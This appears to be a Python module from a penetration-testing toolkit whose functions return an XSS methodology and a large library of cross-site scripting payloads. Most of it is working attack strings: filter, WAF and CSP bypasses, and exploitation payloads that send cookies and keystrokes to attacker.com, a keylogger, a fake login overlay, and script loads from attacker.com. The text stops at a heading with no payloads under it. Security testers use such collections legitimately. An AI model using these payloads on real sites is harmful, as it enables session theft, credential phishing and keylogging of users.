#!/usr/bin/env python3
"""
Hunt Mode - Advanced Attack Payload Library
Professional penetration testing payloads with comprehensive methodologies

Version: 3.0 - Complete Edition
Author: Hunt Mode Team
Sources: PayloadsAllTheThings, HowToHunt, OWASP, Real-World Bug Bounties

Categories:
- Injection Attacks (SQL, NoSQL, LDAP, XPath, Command, SSTI, XXE)
- Cross-Site Attacks (XSS, CSRF, Clickjacking)
- Authentication & Authorization (Auth Bypass, JWT, IDOR, Session, 2FA)
- File Attacks (Upload, LFI, RFI, Path Traversal)
- Server-Side Attacks (SSRF, Deserialization, Race Conditions)
- API Security (REST, GraphQL, WebSocket)
- Advanced Techniques (HTTP Smuggling, Cache Poisoning, HPP, CRLF)
- Business Logic & Misc (Open Redirect, CORS, Mass Assignment)
"""

# ============================================================================
# XSS (CROSS-SITE SCRIPTING)
# ============================================================================


def generate_xss_methodology():
    """Complete XSS testing methodology with advanced techniques"""
    return r"""╔══════════════════════════════════════════════════════════════════╗
║                  🎯 XSS COMPLETE METHODOLOGY                     ║
╚══════════════════════════════════════════════════════════════════╝

📋 PROFESSIONAL TESTING WORKFLOW
═══════════════════════════════════════════════════════════════════

Phase 1: RECONNAISSANCE
├─ Map application attack surface
├─ Identify all input vectors
├─ Document reflection points
└─ Analyze client-side code

Phase 2: CONTEXT ANALYSIS  
├─ HTML context detection
├─ Attribute context detection
├─ JavaScript context detection
└─ CSS context detection

Phase 3: FILTER IDENTIFICATION
├─ Character blacklisting
├─ Keyword filtering
├─ WAF detection
└─ CSP analysis

Phase 4: BYPASS DEVELOPMENT
├─ Encoding techniques
├─ Case manipulation
├─ Protocol handlers
└─ Event handlers

Phase 5: EXPLOITATION
├─ Session hijacking
├─ Keylogging
├─ Phishing overlays
└─ Data exfiltration

═══════════════════════════════════════════════════════════════════
PHASE 1: INPUT DISCOVERY
═══════════════════════════════════════════════════════════════════

🔍 URL Parameters:
   GET parameters: ?search=test&filter=all
   Path segments: /blog/test/view
   Fragments: #section

🔍 POST Data:
   Form fields: username, password, comment
   JSON payloads: {"search": "test"}
   XML payloads: <search>test</search>
   Multipart data: file uploads with metadata

🔍 HTTP Headers:
   User-Agent: Mozilla/5.0...
   Referer: https://attacker.com
   X-Forwarded-For: 127.0.0.1
   Cookie: session=abc123
   Custom headers: X-Request-ID, X-Correlation-ID

🔍 Special Locations:
   File upload filenames
   PDF generators (HTML → PDF)
   Email notifications (HTML emails)
   Error messages
   Search suggestions (autocomplete)
   Rich text editors
   Markdown renderers

🔍 Client-Side:
   DOM sources: location.hash, location.search
   postMessage() receivers
   WebSocket messages
   Service Worker messages

═══════════════════════════════════════════════════════════════════
PHASE 2: CONTEXT IDENTIFICATION
═══════════════════════════════════════════════════════════════════

📍 HTML Context Detection:

Test Input: <test123>
Reflected as: <test123>
Context: Direct HTML injection
Payload: <img src=x onerror=alert(1)>

─────────────────────────────────────────────────────────────────

📍 HTML Attribute Context:

Test Input: "test123
Reflected as: <input value="test123">
Context: Inside attribute with quotes
Payload: " autofocus onfocus=alert(1) x="

Test Input: 'test123
Reflected as: <input value='test123'>
Context: Inside attribute with single quotes
Payload: ' autofocus onfocus=alert(1) x='

─────────────────────────────────────────────────────────────────

📍 JavaScript String Context:

Test Input: test123
Reflected as: <script>var x='test123';</script>
Context: Inside JS string
Payload: '-alert(1)-'

─────────────────────────────────────────────────────────────────

📍 Event Handler Context:

Test Input: test123
Reflected as: <div onclick="location='test123'">
Context: Inside event handler
Payload: javascript:alert(1)

═══════════════════════════════════════════════════════════════════
PHASE 3: EXPLOITATION PAYLOADS
═══════════════════════════════════════════════════════════════════

💣 Session Hijacking:
<script>fetch('https://attacker.com?c='+document.cookie)</script>

💣 Keylogger:
<script>
document.addEventListener('keypress', e => {
  fetch('https://attacker.com/log?k='+e.key);
});
</script>

💣 Phishing Overlay:
<script>
document.body.innerHTML='<h1>Session Expired</h1><form action="https://attacker.com/phish"><input name="u" placeholder="Username"><input type="password" name="p" placeholder="Password"><button>Login</button></form>';
</script>

═══════════════════════════════════════════════════════════════════
TESTING CHECKLIST
═══════════════════════════════════════════════════════════════════

☐ GET parameters
☐ POST parameters
☐ HTTP headers (User-Agent, Referer, Cookie)
☐ JSON/XML payloads
☐ File upload (filename + content)
☐ WebSocket messages
☐ DOM-based XSS
☐ Stored XSS with time delay
☐ CSP bypass attempts"""


def generate_xss_payloads():
    """Comprehensive XSS payload collection - Complete Edition"""
    return r"""╔══════════════════════════════════════════════════════════════════╗
║              💉 XSS COMPREHENSIVE PAYLOAD LIBRARY               ║
╚══════════════════════════════════════════════════════════════════╝

═══════════════════════════════════════════════════════════════════
BASIC PAYLOADS - STANDARD VECTORS
═══════════════════════════════════════════════════════════════════

<script>alert(1)</script>
<script>alert(document.domain)</script>
<script>alert(document.cookie)</script>
<script>confirm(1)</script>
<script>prompt(1)</script>

═══════════════════════════════════════════════════════════════════
BASICS - HTML INJECTION
═══════════════════════════════════════════════════════════════════

Use when input lands inside an attribute's value of an HTML tag or outside tag
Prepend "-->" to payload if input lands in HTML comments

<svg onload=alert(1)>
"><svg onload=alert(1)>

═══════════════════════════════════════════════════════════════════
BASICS - HTML INJECTION - TAG BLOCK BREAKOUT
═══════════════════════════════════════════════════════════════════

Use when input lands inside or between opening/closing tags:
<title> <style> <script> <textarea> <noscript> <pre> <xmp> <iframe>

</title><svg onload=alert(1)>
"></title><svg onload=alert(1)>
</style><svg onload=alert(1)>
"></style><svg onload=alert(1)>
</script><svg onload=alert(1)>
"></script><svg onload=alert(1)>
</textarea><svg onload=alert(1)>
"></textarea><svg onload=alert(1)>
</noscript><svg onload=alert(1)>
</pre><svg onload=alert(1)>
</xmp><svg onload=alert(1)>
</iframe><svg onload=alert(1)>

═══════════════════════════════════════════════════════════════════
BASICS - HTML INJECTION - INLINE
═══════════════════════════════════════════════════════════════════

Use when input lands inside an attribute's value but tag can't be terminated by >

"onmouseover=alert(1) //
"autofocus onfocus=alert(1) //

═══════════════════════════════════════════════════════════════════
BASICS - HTML INJECTION - SOURCE
═══════════════════════════════════════════════════════════════════

Use when input lands as value of: href, src, data, action, formaction

javascript:alert(1)
data:text/html,<script>alert(1)</script>
data:,alert(1)

═══════════════════════════════════════════════════════════════════
BASICS - JAVASCRIPT INJECTION
═══════════════════════════════════════════════════════════════════

Use when input lands in a script block, inside a string delimited value

'-alert(1)-'
'/alert(1)//
';-alert(1)//
"-alert(1)-"
"/alert(1)//
";-alert(1)//

Also try to break script tag without escape:
</script><svg/onload=alert(1)>

═══════════════════════════════════════════════════════════════════
BASICS - JAVASCRIPT INJECTION - ESCAPE BYPASS
═══════════════════════════════════════════════════════════════════

Use when quotes are escaped by a backslash

\'/alert(1)//
\';alert(1)//
\"/alert(1)//
\";alert(1)//

═══════════════════════════════════════════════════════════════════
BASICS - JAVASCRIPT INJECTION - SCRIPT BREAKOUT
═══════════════════════════════════════════════════════════════════

Use when input lands anywhere within a script block

</script><svg onload=alert(1)>

═══════════════════════════════════════════════════════════════════
IMG TAG VECTORS
═══════════════════════════════════════════════════════════════════

<img src=x onerror=alert(1)>
<img src=x onerror=alert(document.domain)>
<img src=x onerror=alert`1`>
<img/src=x/onerror=alert(1)>
<img src onerror=alert(1)>
<img src=1 onerror=alert(1)>

═══════════════════════════════════════════════════════════════════
SVG VECTORS
═══════════════════════════════════════════════════════════════════

<svg onload=alert(1)>
<svg><script>alert(1)</script></svg>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<svg><foreignObject><body onload=alert(1)></foreignObject>
<svg><set onbegin=alert(1)>
<svg><set end=1 onend=alert(1)>

═══════════════════════════════════════════════════════════════════
IFRAME VECTORS
═══════════════════════════════════════════════════════════════════

<iframe src=javascript:alert(1)>
<iframe src="data:text/html,<script>alert(1)</script>">
<iframe srcdoc="<script>alert(1)</script>">
<iframe src=javascript:alert(1)>
<iframe srcdoc=%26lt;svg/o%26%23x6Eload%26equals;alert%26lpar;1)%26gt;>

═══════════════════════════════════════════════════════════════════
INPUT/FORM VECTORS
═══════════════════════════════════════════════════════════════════

<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<form action=javascript:alert(1)><button>Click</button></form>
<form action=javascript:alert(1)><input type=submit>
<isindex action=javascript:alert(1) type=submit value=click>
<form><button formaction=javascript:alert(1)>click</form>
<form><input formaction=javascript:alert(1) type=submit value=click>
<form><input formaction=javascript:alert(1) type=image value=click>
<form><input formaction=javascript:alert(1) type=image src=SOURCE>
<isindex formaction=javascript:alert(1) type=submit value=click>

═══════════════════════════════════════════════════════════════════
ADVANCED - JAVASCRIPT INJECTION - LOGICAL BLOCK
═══════════════════════════════════════════════════════════════════

Use when input lands in script block inside a string in a logical block
(function, if, else, etc). If quote is escaped with backslash, use 3rd payload

'}alert(1);{'
'}alert(1)%0A{'
\'}alert(1);{//

═══════════════════════════════════════════════════════════════════
ADVANCED - JAVASCRIPT INJECTION - QUOTELESS (JS VARIABLES)
═══════════════════════════════════════════════════════════════════

Use when there's multi reflection in same line of JS code

/alert(1)//\
/alert(1)}//\

═══════════════════════════════════════════════════════════════════
ADVANCED - JAVASCRIPT CONTEXT - TEMPLATE LITERAL
═══════════════════════════════════════════════════════════════════

Use when input lands inside backticks (``) or template engines

${alert(1)}

═══════════════════════════════════════════════════════════════════
ADVANCED - MULTI REFLECTION HTML INJECTION - DOUBLE REFLECTION
═══════════════════════════════════════════════════════════════════

Use to take advantage of multiple reflections on same page

'onload=alert(1)><svg/1='
'>alert(1)</script><script/1='
/alert(1)</script><script>/

═══════════════════════════════════════════════════════════════════
ADVANCED - DOUBLE REFLECTION (HTML + JAVASCRIPT)
═══════════════════════════════════════════════════════════════════

Use when two reflections: one in HTML tag & another in javascript line

'--><svg/onload=alert(1)><!--
"--><svg/onload=alert(1)><!--

═══════════════════════════════════════════════════════════════════
ADVANCED - TRIPLE REFLECTION (SINGLE INPUT)
═══════════════════════════════════════════════════════════════════

*/alert(1)">'onload="/*<svg/1='
-alert(1)">'onload="`<svg/1='
**/</script>'>alert(1)/*<script/1='

═══════════════════════════════════════════════════════════════════
ADVANCED - MULTI INPUT REFLECTIONS (HTTP PARAMETER POLLUTION)
═══════════════════════════════════════════════════════════════════

p=<svg/1='&q='onload=alert(1)>
p=<svg 1='&q='onload='/**&r=**/alert(1)'>
q=<script/&q=/src=data:&q=alert(1)>

═══════════════════════════════════════════════════════════════════
ADVANCED - FILE UPLOAD INJECTION - FILENAME
═══════════════════════════════════════════════════════════════════

Use when uploaded filename is reflected somewhere in target page

"><svg onload=alert(1)>.gif
"><svg onload=alert(1)>.jpg
"><svg onload=alert(1)>.png

═══════════════════════════════════════════════════════════════════
ADVANCED - FILE UPLOAD INJECTION - METADATA
═══════════════════════════════════════════════════════════════════

Use when metadata of uploaded file is reflected
Using command-line exiftool:

$ exiftool -Artist='"><svg onload=alert(1)>' xss.jpeg

═══════════════════════════════════════════════════════════════════
ADVANCED - FILE UPLOAD INJECTION - SVG FILE
═══════════════════════════════════════════════════════════════════

Save content as "xss.svg"

<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>

═══════════════════════════════════════════════════════════════════
ADVANCED - DOM INSERT INJECTION
═══════════════════════════════════════════════════════════════════

Use when injection gets inserted into DOM as valid markup
instead of being reflected in source code

<img src=1 onerror=alert(1)>
<iframe src=javascript:alert(1)>
<details open ontoggle=alert(1)>
<svg><svg onload=alert(1)>

═══════════════════════════════════════════════════════════════════
ADVANCED - DOM INSERT INJECTION - RESOURCE REQUEST
═══════════════════════════════════════════════════════════════════

Use when native javascript inserts results of controllable URL request

data:text/html,<img src=1 onerror=alert(1)>
data:text/html,<iframe src=javascript:alert(1)>

═══════════════════════════════════════════════════════════════════
ADVANCED - PHP SELF URL INJECTION
═══════════════════════════════════════════════════════════════════

Use when current URL is used by PHP as an attribute value
Inject between .php extension and start of query (?)

https://example.com/xss.php/"><svg onload=alert(1)>?a=reader

═══════════════════════════════════════════════════════════════════
ADVANCED - MARKDOWN VECTOR
═══════════════════════════════════════════════════════════════════

Use in text boxes, comment sections that allow markup input

[clickme](javascript:alert(1))

═══════════════════════════════════════════════════════════════════
ADVANCED - SCRIPT INJECTION - NO CLOSING TAG
═══════════════════════════════════════════════════════════════════

Use when there's a closing script tag (</script>) after reflection

<script src=data:,alert(1)>
<script src=//attacker.com/1.js>

═══════════════════════════════════════════════════════════════════
ADVANCED - JAVASCRIPT POSTMESSAGE() DOM INJECTION
═══════════════════════════════════════════════════════════════════

Use when there's a "message" event listener without origin check
Target must be frameable. Provide TARGET_URL and INJECTION

<iframe src=TARGET_URL onload="frames[0].postMessage('INJECTION','*')">

═══════════════════════════════════════════════════════════════════
ADVANCED - XML-BASED XSS
═══════════════════════════════════════════════════════════════════

Use in XML pages (content types text/xml or application/xml)
Prepend "-->" if in comment section or "]]>" if in CDATA section

<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1)</x:script>
<x:script xmlns:x="http://www.w3.org/1999/xhtml" src="//attacker.com/1.js"/>

═══════════════════════════════════════════════════════════════════
ADVANCED - ANGULARJS INJECTIONS (v1.6+)
═══════════════════════════════════════════════════════════════════

Use when AngularJS library is loaded with ng-app directive

{{$new.constructor('alert(1)')()}}
<x ng-app>{{$new.constructor('alert(1)')()}}

═══════════════════════════════════════════════════════════════════
ADVANCED - DOM XSS IN JQUERY
═══════════════════════════════════════════════════════════════════

jQuery's attr() function can change DOM element attributes

?returnUrl=javascript:alert(document.domain)

jQuery $() selector vulnerability with location.hash:

#" onload="this.src+='<img src=1 onerror=alert(1)>

═══════════════════════════════════════════════════════════════════
ADVANCED - ONSCROLL UNIVERSAL VECTOR
═══════════════════════════════════════════════════════════════════

XSS without user interaction using onscroll
Works with: address, blockquote, body, center, dir, div, dl, dt, form,
li, menu, ol, p, pre, ul, h1-h6

<p style=overflow:auto;font-size:999px onscroll=alert(1)>AAA<x/id=y></p>#y

═══════════════════════════════════════════════════════════════════
ADVANCED - TYPE JUGGLING
═══════════════════════════════════════════════════════════════════

Use to pass "if" condition matching a number in loose comparisons

1<svg onload=alert(1)>
1"><svg onload=alert(1)>

═══════════════════════════════════════════════════════════════════
ADVANCED - XSS IN SSI (SERVER-SIDE INCLUDE)
═══════════════════════════════════════════════════════════════════

<<!--%23set var="x" value="svg onload=alert(1)"--><!--%23echo var="x"-->>

═══════════════════════════════════════════════════════════════════
ADVANCED - SQLI ERROR-BASED XSS
═══════════════════════════════════════════════════════════════════

Use in endpoints where SQL error message can be triggered

'1<svg onload=alert(1)>
<svg onload=alert(1)>\

═══════════════════════════════════════════════════════════════════
ADVANCED - INJECTION IN JSP PATH
═══════════════════════════════════════════════════════════════════

Use in JSP-based applications in URL path

//DOMAIN/PATH/;<svg onload=alert(1)>
//DOMAIN/PATH/;"><svg onload=alert(1)>

═══════════════════════════════════════════════════════════════════
ADVANCED - JS INJECTION - REFERENCEERROR FIX
═══════════════════════════════════════════════════════════════════

Use to fix syntax of hanging javascript code
Check console for ReferenceError and replace accordingly

';alert(1);var myObj='
';alert(1);function myFunc(){}'

═══════════════════════════════════════════════════════════════════
ADVANCED - BOOTSTRAP VECTOR (up to v3.4.0)
═══════════════════════════════════════════════════════════════════

Use when bootstrap library present. Bypasses Webkit Auditor
Click anywhere to trigger. Chars can be HTML encoded

<html data-toggle=tab href="<img src=x onerror=alert(1)>">

═══════════════════════════════════════════════════════════════════
ADVANCED - BROWSER NOTIFICATION
═══════════════════════════════════════════════════════════════════

Alternative to alert, prompt, confirm. Requires user acceptance first

Notification.requestPermission(x=>{new(Notification)(1)})
new(Notification)(1)

═══════════════════════════════════════════════════════════════════
ADVANCED - XSS IN HTTP HEADER - CACHED
═══════════════════════════════════════════════════════════════════

Store XSS vector using MISS-MISS-HIT cache scheme
Replace <XSS> with vector. Fire same request 3 times

$ curl -H "Vulnerable_Header: <XSS>" TARGET/?dummy_string

═══════════════════════════════════════════════════════════════════
BYPASS - MIXED CASE
═══════════════════════════════════════════════════════════════════

Use to bypass case-sensitive filters

<Svg OnLoad=alert(1)>
<Script>alert(1)</Script>
<sCrIpT>alert(1)</sCrIpT>

═══════════════════════════════════════════════════════════════════
BYPASS - UNCLOSED TAGS
═══════════════════════════════════════════════════════════════════

Avoid filtering based on presence of both < and >
Requires native > sign in source code after reflection

<svg onload=alert(1)//
<svg onload="alert(1)"

═══════════════════════════════════════════════════════════════════
BYPASS - UPPERCASE XSS
═══════════════════════════════════════════════════════════════════

Use when application reflects input in uppercase
Replace "&" with "%26" and "#" with "%23" in URLs

<SVG ONLOAD=&#97&#108&#101&#114&#116(1)>
<SCRIPT SRC=//ATTACKER.COM/1></SCRIPT>

═══════════════════════════════════════════════════════════════════
BYPASS - EXTRA CONTENT FOR SCRIPT TAGS
═══════════════════════════════════════════════════════════════════

Use when filter looks for "<script>" with variations but doesn't check
for other non-required attributes

<script/x>alert(1)</script>
<script x>alert(1)</script>
<script/src=data:,alert(1)>

═══════════════════════════════════════════════════════════════════
BYPASS - DOUBLE ENCODED XSS
═══════════════════════════════════════════════════════════════════

Use when application performs double decoding

%253Csvg%2520o%256Eload%253Dalert%25281%2529%253E
%2522%253E%253Csvg%2520o%256Eload%253Dalert%25281%2529%253E

═══════════════════════════════════════════════════════════════════
BYPASS - ALERT WITHOUT PARENTHESES (STRINGS ONLY)
═══════════════════════════════════════════════════════════════════

Use when parentheses not allowed and simple alert is enough

alert`1`

═══════════════════════════════════════════════════════════════════
BYPASS - ALERT WITHOUT PARENTHESES
═══════════════════════════════════════════════════════════════════

Use when parentheses not allowed and PoC requires returning target info

setTimeout`alert\x28document.domain\x29`
setInterval`alert\x28document.domain\x29`

═══════════════════════════════════════════════════════════════════
BYPASS - ALERT WITHOUT PARENTHESES - HTML ENTITIES
═══════════════════════════════════════════════════════════════════

Use only in HTML injections when parentheses not allowed
Replace "&" with "%26" and "#" with "%23" in URLs

<svg onload=alert&#40;1)>
<svg onload=alert&#x28;1&#x29;>
<svg onload=alert(1&#41;>

═══════════════════════════════════════════════════════════════════
BYPASS - ALERT WITHOUT ALPHABETIC CHARS
═══════════════════════════════════════════════════════════════════

Use when alphabetic characters not allowed. Following is alert(1)

[]['\146\151\154\164\145\162']['\143\157\156\163\164\162\165\143\164\157\162']('\141\154\145\162\164\50\61\51')()

═══════════════════════════════════════════════════════════════════
BYPASS - ALERT OBFUSCATION
═══════════════════════════════════════════════════════════════════

Use to trick regex filters. Can be combined with other alternatives
"top" can be replaced by "window", "parent", "self", "this"

(alert)(1)
a=alert,a(1)
[1].find(alert)
top["al"+"ert"](1)
top[/al/.source+/ert/.source](1)
al\u0065rt(1)
top['al\145rt'](1)
top[8680439..toString(30)](1)

═══════════════════════════════════════════════════════════════════
BYPASS - ALERT ALTERNATIVE - WRITE & WRITELN
═══════════════════════════════════════════════════════════════════

Alternative to alert, prompt, confirm
Replace "&" with "%26" and "#" with "%23" in URLs

write`XSSed!`
write`<img/src/o&#78error=alert&lpar;1)&gt;`
write('\74img/src/o\156error\75alert\501\51\76')

═══════════════════════════════════════════════════════════════════
BYPASS - ALERT ALTERNATIVE - OPEN PSEUDO-PROTOCOL
═══════════════════════════════════════════════════════════════════

Alternative to alert, prompt, confirm
Second one only works in Chromium-based browsers with <iframe name=0>

top.open`javas\cript:al\ert\x281\x29`
top.open`javas\cript:al\ert\x281\x29${0}0`

═══════════════════════════════════════════════════════════════════
BYPASS - ALERT ALTERNATIVE - EVAL + URL
═══════════════════════════════════════════════════════════════════

In URL path after PHP extension or in fragment
Plus sign (+) must be encoded in URLs

<svg onload=eval("'"+URL)>
<svg id=eval onload=top[id]("'"+URL)>

PoC URL must contain:
=> FILE.php/'/alert(1)//?...
=> #'/alert(1)

═══════════════════════════════════════════════════════════════════
BYPASS - ALERT ALTERNATIVE - EVAL + URL WITH TEMPLATE LITERAL
═══════════════════════════════════════════════════════════════════

${alert(1)}<svg onload=eval('`//'+URL)>

═══════════════════════════════════════════════════════════════════
BYPASS - HTML INJECTION - INLINE ALTERNATIVE
═══════════════════════════════════════════════════════════════════

Use to bypass blacklists

"onpointerover=alert(1) //
"autofocus onfocusin=alert(1) //

═══════════════════════════════════════════════════════════════════
BYPASS - STRIP-TAGS BASED (PHP strip_tags())
═══════════════════════════════════════════════════════════════════

Use when filter strips anything between < and > characters
Inline injection only

"o<x>nmouseover=alert<x>(1)//
"autof<x>ocus o<x>nfocus=alert<x>(1)//

═══════════════════════════════════════════════════════════════════
BYPASS - FILE UPLOAD - HTML/JS GIF DISGUISE
═══════════════════════════════════════════════════════════════════

Bypass CSP via file upload. Save as "xss.gif" or "xss.js"
Can be imported with <link rel=import href=xss.gif> or <script src=xss.js>

GIF89a=//<script>
alert(1)//</script>;

═══════════════════════════════════════════════════════════════════
BYPASS - JUMP TO URL FRAGMENT (#)
═══════════════════════════════════════════════════════════════════

Hide characters from WAF using URL fragment

eval(URL.slice(-8)) #alert(1)
eval(location.hash.slice(1)) #alert(1)
document.write(decodeURI(location.hash)) #<img/src/onerror=alert(1)>

═══════════════════════════════════════════════════════════════════
BYPASS - SECOND ORDER XSS INJECTION
═══════════════════════════════════════════════════════════════════

Use when input will be used twice (stored normalized, then retrieved)

&lt;svg/onload&equals;alert(1)&gt;

═══════════════════════════════════════════════════════════════════
BYPASS - PHP SPELL CHECKER (pspell_new)
═══════════════════════════════════════════════════════════════════

Bypass PHP's pspell_new function

<scrpt> confirm(1) </scrpt>

═══════════════════════════════════════════════════════════════════
BYPASS - EVENT ORIGIN BYPASS FOR POSTMESSAGE()
═══════════════════════════════════════════════════════════════════

Bypass origin check by prepending allowed origin as subdomain

http://facebook.com.localhost/crosspwn.html?target=//victim.com/test.html&msg=<script>alert(1)</script>

═══════════════════════════════════════════════════════════════════
BYPASS - CSP BYPASS (WHITELISTED GOOGLE DOMAINS)
═══════════════════════════════════════════════════════════════════

Use when CSP allows execution from these domains

<script src=//www.google.com/complete/search?client=chrome%26jsonp=alert(1)></script>
<script src=//www.googleapis.com/customsearch/v1?callback=alert(1)></script>
<script src=//ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.min.js></script><x ng-app ng-csp>{{$new.constructor('alert(1)')()}}

═══════════════════════════════════════════════════════════════════
BYPASS - SVG VECTORS WITH EVENT HANDLERS
═══════════════════════════════════════════════════════════════════

Works on Firefox. Adding attributename=x inside <set> works in Chromium
"Set" can be replaced by "animate". Use against blacklists

<svg><set onbegin=alert(1)>
<svg><set end=1 onend=alert(1)>
<svg><set attributename=x onbegin=alert(1)>

═══════════════════════════════════════════════════════════════════
BYPASS - SVG VECTORS WITHOUT EVENT HANDLERS
═══════════════════════════════════════════════════════════════════

Avoid filters looking for event handlers or src, data, etc
Last one is Firefox only, already URL encoded

<svg><a><rect width=99% height=99% /><animate attributeName=href to=javascript:alert(1)>
<svg><a><rect width=99% height=99% /><animate attributeName=href values=javascript:alert(1)>
<svg><a><rect width=99% height=99% /><animate attributeName=href to=0 from=javascript:alert(1)>
<svg><use xlink:href=data:image/svg+xml;base64,PHN2ZyBpZD0ieCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayI+PGVtYmVkIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIiBzcmM9ImphdmFzY3JpcHQ6YWxlcnQoMSkiLz48L3N2Zz4=#x>

═══════════════════════════════════════════════════════════════════
BYPASS - VECTORS WITHOUT EVENT HANDLERS
═══════════════════════════════════════════════════════════════════

Alternative to event handlers. Some require user interaction

<script>alert(1)</script>
<script src=data:,alert(1)>
<iframe src=javascript:alert(1)>
<embed src=javascript:alert(1)>
<a href=javascript:alert(1)>click
<math><brute href=javascript:alert(1)>click
<form action=javascript:alert(1)><input type=submit>
<isindex action=javascript:alert(1) type=submit value=click>
<form><button formaction=javascript:alert(1)>click
<form><input formaction=javascript:alert(1) type=submit value=click>
<form><input formaction=javascript:alert(1) type=image value=click>
<form><input formaction=javascript:alert(1) type=image src=SOURCE>
<isindex formaction=javascript:alert(1) type=submit value=click>
<object data=javascript:alert(1)>
<iframe srcdoc=<svg/o&#x6Eload=alert(1)>>
<svg><script xlink:href=data:,alert(1) />
<math><brute xlink:href=javascript:alert(1)>click

═══════════════════════════════════════════════════════════════════
BYPASS - VECTORS WITH AGNOSTIC EVENT HANDLERS
═══════════════════════════════════════════════════════════════════

Use when all known HTML tag names not allowed
Any alphabetic char/string can be used as tag name ("x")
Require user interaction

<x contenteditable onblur=alert(1)>lose focus!
<x onclick=alert(1)>click this!
<x oncopy=alert(1)>copy this!
<x oncontextmenu=alert(1)>right click this!
<x onauxclick=alert(1)>right click this!
<x oncut=alert(1)>copy this!
<x ondblclick=alert(1)>double click this!
<x ondrag=alert(1)>drag this!
<x contenteditable onfocus=alert(1)>focus this!
<x contenteditable oninput=alert(1)>input here!
<x contenteditable onkeydown=alert(1)>press any key!
<x contenteditable onkeypress=alert(1)>press any key!
<x contenteditable onkeyup=alert(1)>press any key!
<x onmousedown=alert(1)>click this!
<x onmouseenter=alert(1)>hover this!
<x onmousemove=alert(1)>hover this!
<x onmouseout=alert(1)>hover this!
<x onmouseover=alert(1)>hover this!
<x onmouseup=alert(1)>click this!
<x contenteditable onpaste=alert(1)>paste here!
<x onpointercancel=alert(1)>hover this!
<x onpointerdown=alert(1)>hover this!
<x onpointerenter=alert(1)>hover this!
<x onpointerleave=alert(1)>hover this!
<x onpointermove=alert(1)>hover this!
<x onpointerout=alert(1)>hover this!
<x onpointerover=alert(1)>hover this!
<x onpointerup=alert(1)>hover this!
<x onpointerrawupdate=alert(1)>hover this!

═══════════════════════════════════════════════════════════════════
BYPASS - MIXED CONTEXT REFLECTION ENTITY BYPASS
═══════════════════════════════════════════════════════════════════

Turn filtered reflection in script block into valid JS code
Requires reflection in both HTML and JS contexts, close to each other
Vectors for: single quote sanitized, single quote escaped,
double quote sanitized, double quote escaped

">'-alert(1)-'<svg>
">&#39-alert(1)-&#39<svg>
">alert(1)-"<svg>
"&#34>alert(1)-&#34<svg>

═══════════════════════════════════════════════════════════════════
BYPASS - STRIP-MY-SCRIPT VECTOR
═══════════════════════════════════════════════════════════════════

Trick filters that strip the classic XSS vector
Works as is and if "<script>" gets stripped

<svg/on<script><script>load=alert(1)//</script>

═══════════════════════════════════════════════════════════════════
BYPASS - JAVASCRIPT ALTERNATIVE COMMENTS
═══════════════════════════════════════════════════════════════════

Use when regular JS comments (//) not allowed, escaped or removed

<!--
%0A-->

═══════════════════════════════════════════════════════════════════
BYPASS - JS LOWERCASED INPUT
═══════════════════════════════════════════════════════════════════

Use when application turns input into lowercase via JS
Might work for server-side lowercase too

<SCRİPT>alert(1)</SCRİPT>
<SCRİPT/SRC=data:,alert(1)>

═══════════════════════════════════════════════════════════════════
BYPASS - OVERLONG UTF-8
═══════════════════════════════════════════════════════════════════

Use when target performs best-fit mapping

%CA%BA>%EF%BC%9Csvg/onload%EF%BC%9Dalert%EF%BC%881)>

═══════════════════════════════════════════════════════════════════
BYPASS - VECTORS EXCLUSIVE FOR ASP PAGES
═══════════════════════════════════════════════════════════════════

Bypass <[alpha] filtering in .asp pages

%u003Csvg onload=alert(1)>
%u3008svg onload=alert(2)>
%uFF1Csvg onload=alert(3)>

═══════════════════════════════════════════════════════════════════
BYPASS - PHP EMAIL VALIDATION
═══════════════════════════════════════════════════════════════════

Bypass FILTER_VALIDATE_EMAIL flag of PHP's filter_var()

"><svg/onload=alert(1)>"@x.y

═══════════════════════════════════════════════════════════════════
BYPASS - PHP URL VALIDATION
═══════════════════════════════════════════════════════════════════

Bypass FILTER_VALIDATE_URL flag of PHP's filter_var()

javascript://%250Aalert(1)

═══════════════════════════════════════════════════════════════════
BYPASS - PHP URL VALIDATION - QUERY REQUIRED
═══════════════════════════════════════════════════════════════════

Bypass FILTER_VALIDATE_URL with FILTER_FLAG_QUERY_REQUIRED

javascript://%250Aalert(1)//?1
javascript://%250A1?alert(1):0
javascript://https://DOMAIN/%250A1?alert(1):0

═══════════════════════════════════════════════════════════════════
BYPASS - DOM INSERTION VIA SERVER SIDE REFLECTION
═══════════════════════════════════════════════════════════════════

Use when input reflected into source but can't execute by reflecting
Avoids browser filtering and WAFs

\74svg o\156load\75alert\501\51\76

═══════════════════════════════════════════════════════════════════
BYPASS - XML-BASED VECTOR
═══════════════════════════════════════════════════════════════════

Bypass browser filtering and WAFs in XML pages
Prepend "-->" if in comment or "]]>" if in CDATA

<*:script xmlns:*="http://www.w3.org/1999/xhtml">alert(1)</_:script>

═══════════════════════════════════════════════════════════════════
BYPASS - JAVASCRIPT CONTEXT - CODE INJECTION (IE11/EDGE)
═══════════════════════════════════════════════════════════════════

Bypass Microsoft IE11 or Edge when injecting into JS context

';onerror=alert;throw 1//

═══════════════════════════════════════════════════════════════════
BYPASS - HTML CONTEXT - TAG INJECTION (IE11/EDGE)
═══════════════════════════════════════════════════════════════════

Bypass native filter in multi reflection scenarios

"'>confirm(1)</Script><Svg><Script/1='

═══════════════════════════════════════════════════════════════════
BYPASS - JAVASCRIPT PSEUDO-PROTOCOL OBFUSCATION
═══════════════════════════════════════════════════════════════════

Bypass filters looking for javascript:alert(1)
Encode properly in URLs

javas&#99ript:1
javascript&colon;1
javascript&#9:1
&#1javascript:1
"javas%0Dcript:1"
%00javascript:1

═══════════════════════════════════════════════════════════════════
BYPASS - ANGULARJS INJECTION (v1.6+) - NO PARENS/BRACKETS/QUOTES
═══════════════════════════════════════════════════════════════════

Avoid filtering. First avoids parentheses, second avoids brackets,
last avoids quotes. Encode properly in URLs

